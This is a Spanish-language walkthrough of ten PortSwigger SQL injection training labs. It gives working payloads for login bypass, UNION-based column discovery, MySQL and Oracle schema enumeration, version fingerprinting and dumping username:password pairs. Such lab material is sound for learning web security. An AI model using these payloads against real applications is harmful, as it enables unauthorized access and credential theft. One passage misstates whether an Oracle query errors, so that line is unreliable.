<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/sqlinjection-banner.jpg">

# ¿Qué es SQL Injection?

AQL Injection es una vulnerabilidad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos, gracias a esta vulnerabilidad un atacante puede llegar a ver datos que normalmente no son publicos para terceros. Esto puede incluir datos pertenecientes a otros usuarios o cualquier otro dato sobre la aplicación.

Aquí estarán las resoluciones de los laboratorios de [PortSwigger](https://portswigger.net/web-security/sql-injection)

# 1. Lab: Vulnerability in WHERE clause allowing retrieval of hidden data

> https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

Al entrar el laboratorio veremos esto:
<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab1-sqli.png">

Tenemos varios botones, que al hacerles clic modifican la URL, vamos a darle por ejemplo a ```"Gifts"```

Luego de hacerlo, en la URL se agregara ```/filter?category=Gifts```

Podemos pensar que por detrás la aplicación web está realizando la siguiente consulta a la base de datos:

```SELECT * FROM products WHERE category = 'Gifts' AND released = 1```

Esta query SQL, lo que está haciendo es solicitar todos los datos, dentro de la tabla ```products```, mientras que con el ```WHERE``` filtra por la columna ```Gifts```, y con ```AND released = 1``` se seleccionarán los productos que ya han sido lanzados al mercado.

Para poder explotar esto, podemos intentar inyectar nuestra query SQL en el campo "Gifts", poniendo ```' or 1=1--```

Con la primer ```'``` lo que hacemos es cerrar la primer query, es decir, en vez de estar poniendo 

```SELECT * FROM products WHERE category = 'Gifts'```

Estamos poniendo 

```SELECT * FROM products WHERE category = 'Gifts' or 1=1--'```

luego con el ```or 1=1``` estamos haciendo una comparación que es igual a ```True```, ya que 1 es igual a 1, y para finalizar, con los 2 guiones ```--``` estamos comentando el resto de la query.

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/sqli1.png">

# 2. Lab: Vulnerability allowing login bypass

> https://portswigger.net/web-security/sql-injection/lab-login-bypass

Al entrar a este laboratorio, veremos que hay un apartado llamado ```My account```, el cual al hacerle clic nos redirige a un formulario de inicio de sesión

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab2-sqli.png">

Supongamos que el servidor tramita esta query sql

```SELECT * FROM users WHERE username = 'username' AND password = 'password'```

Podemos bypassear este formulario de inicio de sesión haciendo uso de la anterior query

-  ```'or 1=1--```

Ya que si ponemos como usuario ```'or 1=1--``` la query que enviara el servidor a la base de datos será la siguiente

```SELECT * FROM users WHERE username = '' or 1=1-- '```

Esto sera ignorado ➜ AND password = 'password', gracias a los ```--```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab2-sqli-result.png">

# 3. Lab: UNION attack, determining the number of columns

> https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

## ¿Qué son los UNION Attack?

Cuando una aplicación es vulnerable a la inyección SQL y los resultados de la consulta se devuelven dentro de las respuestas de la aplicación, el UNION es la palabra clave se puede utilizar para recuperar datos de otras tablas dentro de la base de datos.

Bueno, para poder llevar a cabo este ataque, primero debemos saber la cantidad de columnas que contiene la tabla, esto lo podemos averiguar usando la query ```order by```

El primer método consiste en inyectar una serie de ```ORDER BY <NUMERO>``` e ir incrementando el índice de columna especificado hasta que se produzca un error. 
- ```' ORDER BY 1--```
- ```' ORDER BY 2--```
- ```' ORDER BY 3--```

 Cuando el índice de columna especificado excede el número de columnas reales en el conjunto de resultados, la base de datos devuelve un error, como:
 
 ```The ORDER BY position number 3 is out of range of the number of items in the select list.```
 
 No necesariamente tiene que devolver este error, también puede devolver un error en la respuesta de la base de datos a la web, o un error de código 500 (por ejemplo)
 
 El segundo método consiste en enviar una serie de UNION SELECT especificando un número diferente de valores nulos
 
 - ```' UNION SELECT NULL--```
 - ```' UNION SELECT NULL,NULL--```
 - ```' UNION SELECT NULL,NULL,NULL--```

Si el número de nulos no coincide con el número de columnas, la base de datos devuelve un error, como:

```All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.```

O como en el anterior caso, también puede devolver un error en la respuesta de la base de datos a la web o un código de estado no exitoso

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab3-null-error.png">

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab3-null-exito.png">

Como vemos al poner la query ```' UNION SELECT NULL,NULL,NULL--``` no devuelve ningún error, por ende podemos saber que hay 3 columnas.

# 4. Lab: UNION attack, finding a column containing text

> https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

En este laboratorio tenemos que ingresar una cadena de caracteres en la representación de los valores nulos, saber cuál es el campo inyectable, es importante para poder saber en qué columna debemos inyectar las query SQL, esto es ir probando campo por campo para saber en cuál es el campo que podemos usar para la explotación.

- ```' UNION SELECT 'a',NULL,NULL--```
- ```' UNION SELECT NULL,'a',NULL--```
- ```' UNION SELECT NULL,NULL,'a'--```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab-resolve.png">

# 5. Lab: UNION attack, retrieving data from other tables

> https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

Este laboratorio está muy bueno, ya que debemos iniciar sesión como el usuario administrador, pero su credencial la debemos sacar mediante inyecciones SQL

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab5-schemaName.png">

### Formas de enumerar las bases de datos (mysql)

- ```SELECT schema_name FROM information_schema.schemata``` ➜ Esta es la forma basica de listar las bases de datos.
- ```SELECT group_concat(schema_name) FROM information_schema.schemata``` ➜ Nos lista todas las bases de datos separadas por ",".
- ```SELECT schema_name FROM information_schema.schemata LIMIT 0,1``` ➜ Nos devuelve el nombre de la primera base de datos disponible en el servidor MySQL, si lo ponemos en ```LIMIT 1,1``` Nos devolverá el nombre de la segunda base de dato, y así sucesivamente.
- ```SELECT table_schema FROM information_schema.tables GROUP BY table_schema``` ➜ Esta consulta devuelve una lista de todas las bases de datos que contienen tablas.
- ```SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME NOT IN ('information_schema', 'mysql', 'performance_schema')```  Esta consulta devuelve una lista de todas las bases de datos disponibles en el servidor excepto las bases de datos del sistema predeterminadas.

### Formas de enumerar las tablas (mysql)

-  ```SELECT table_name FROM information_schema.tables WHERE table_schema = 'nombre_de_la_base_de_datos'``` ➜ Esta consulta devuelve una lista de todas las tablas disponibles en la base de datos especificada.
-  ```SELECT distinct table_name FROM information_schema.columns WHERE table_schema = 'nombre_de_la_base_de_datos'``` ➜ Esta consulta devuelve una lista de todas las tablas disponibles en la base de datos especificada, filtrando por las columnas existentes.
-  ```SELECT table_name FROM information_schema.tables``` ➜ Esta consulta devuelve todas las tablas de todas las bases de datos.

### Formas de enumerar las columnas (mysql)

- ```SELECT column_name FROM information_schema.columns WHERE table_name = 'nombre_de_la_tabla'``` ➜ Esta consulta devuelve una lista de todas las columnas disponibles en la tabla especificada.
- - ```SELECT column_name FROM information_schema.columns WHERE table_schema = '<DATABASE>' AND table_name = '<TABLA>'--``` ➜ Esta consulta devuelve una lista de todas las columnas disponibles de la tabla indicada y base indicada.

### Formas de dumpear las columnas(mysql)
- ```SELECT username, password FROM users``` ➜ Nos mostrara el contenido suponinedo que la tabla tiene las columnas "username" y "password".
- ```SELECT username, password FROM <database>.users``` ➜ En caso de que la tabla esta en otra base de datos.
- ```SELECT NULL,group_concat(username,':',password) FROM users--``` ➜ Nos mostrara el contenido separados por ":"
- ```SELECT NULL,username||':'||password FROM users--``` ➜ Nos mostrara el contenido separados por ":"
- ```SELECT NULL,concat(username,':',password) from users--``` ➜ Alternativa a ```group_concat```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab6-result.png">

# 6. Lab: UNION attack, retrieving multiple values in a single column

> https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

En este laboratorio tendremos que representar varios valores en una sola columna, una vez tengamos la base de datos en cuestión enumerada, podemos hacer uso de ```concat``` o ```group_concat```.

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab6-resolve.png">

### ¿```concat``` y ```group_concat``` son lo mismo?

No, no son lo mismo, ```CONCAT``` se utiliza para unir dos o más cadenas de texto en una sola, mientras que ```GROUP_CONCAT``` se utiliza para concatenar múltiples valores en una sola cadena, agrupándolos según un criterio específico.

# 7. Lab: Querying the database type and version on Oracle

> https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

En este laboratorio debemos consultar el tipo y la versión de la base de datos en Oracle

Los anteriores laboratorios eran sobre MySQL, por lo tanto, si en este laboratorio intentamos fuzzear por la cantidad de columnas haciendo uso de la típica inyección

- ```' UNION SELECT NULL,NULL,NULL--```

No devolvera error, cada consulta ```SELECT``` debe utilizar la palabra clave ```FROM``` y especificar una tabla válida. Existe una tabla integrada en ```Oracle``` llamada ```dual``` que se puede utilizar para este propósito. Así que las consultas inyectadas en ```Oracle``` tendrían que ser como:

- ```' UNION SELECT NULL,NULL FROM dual--```

### ¿Qué es la tabla dual?

La tabla DUAL es una tabla especial de una sola columna presente de manera predeterminada en todas las instalaciones de bases de datos de Oracle. Se utiliza para seleccionar una seudocolumna como SYSDATE o USER. La tabla tiene una sola columna VARCHAR2(1) llamada DUMMY que tiene un valor de 'X'. 

### ¿Por qué debemos especificarla?

En Oracle, al usar una consulta UNION SELECT para listar las columnas, es necesario especificar una tabla en la cláusula FROM porque esta cláusula se utiliza para indicar de qué tabla se seleccionarán las columnas que se listarán en la consulta.

Si no se especifica una tabla en la cláusula FROM, Oracle no sabrá de qué tabla obtener las columnas y devolverá un error.

Es posible que en algunos casos se pueda utilizar la tabla DUAL, que es una tabla virtual que solo contiene una fila y una columna. Esta tabla se puede utilizar para listar valores o expresiones que no dependen de ninguna tabla en particular

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab7-no-dual.png">

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab7-si-dual.png">

Una vez sepamos la cantidad de columnas y cuál es el campo en el cual podemos inyectar nuestras consultas, para poder saber la versión de la base de datos, tenemos que usar las siguientes query

- ```SELECT banner FROM v$version```
- ```SELECT version FROM v$instance```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab7-resolve.png">

# 8. Lab: Querying the database type and version on MySQL and Microsoft

> https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

Este es un laboratorio bastante facil, ya que nos pide listar simplemente la version de la base de datos

Tanto en MySQL como en MSSQL, para poder ver la version de la base de datos, podemos usar la siguiente query

- ```@@version```

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab8-resolve.png">

# 9. Lab: listing the database contents on non-Oracle databases

> https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

En este laboratorio tendremos que hacer lo mismo que en los anteriores, solamente que ahora las tablas y columnas tienen nombres raros.

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab9-tables.png">

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab9-columns.png">

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab9-resolve.png">

# 10. Lab: Listing the database contents on Oracle

> https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

En este laboratorio tendremos que enumerar una base de datos Oracle

### Listar tablas en Oracle

- ```SELECT table_name FROM all_tables``` ➜ Con esta consulta listamos todas las tablas
- ```SELECT table_name FROM all_tables where owner = 'USERNAME'``` ➜ Con esta consulta listamos las tablas pertenecientes a un usuario en cuestión

### Listar Usuarios propietarios de tablas (Oracle)

- ```SELECT owner FROM all_tables```

### Listar columnas de las tablas (Oracle)

- ```SELECT column_name FROM all_tab_columns``` ➜ Con esto listamos las columnas para todas las tablas
- ```SELECT column_name FROM all_tab_columns where table_name = 'TABLA'``` ➜ Con esto listamos las columnas para la tabla indicada

### Formas de dumpear las columnas(Oracle)

- ```SELECT NULL,USERNAME_RNJYWS||':'||PASSWORD_FMNSWR FROM <TABLA>``` ➜ Con esto listamos el contenido de las columnas separando el resultado por ":"

<img src="https://raw.githubusercontent.com/0nyxMind/Pentesting-Web/main/Vulnerabilidades/Imagenes-Vulns/lab10-resolve.png">
